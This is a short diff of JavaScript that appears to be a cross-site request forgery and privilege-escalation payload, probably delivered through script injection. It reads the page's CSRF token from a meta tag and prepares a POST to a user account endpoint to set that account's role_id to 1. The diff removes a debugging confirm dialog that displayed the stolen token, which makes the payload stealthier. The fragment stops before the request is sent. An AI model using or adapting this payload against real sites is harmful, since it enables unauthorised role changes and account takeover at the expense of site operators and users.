@@ -5,7 +5,6 @@ var account = "/account/users/1155-first-last";
 for (i=0; i<meta.length; i++) {
   if (meta[i].getAttribute("name") == "csrf-token") {
     var csrfToken = meta[i].getAttribute("content");
-    confirm("Users CSRF token: "+csrfToken);
 
     //update this users account to role_id 1
     xmlhttp.open("POST",account,true);
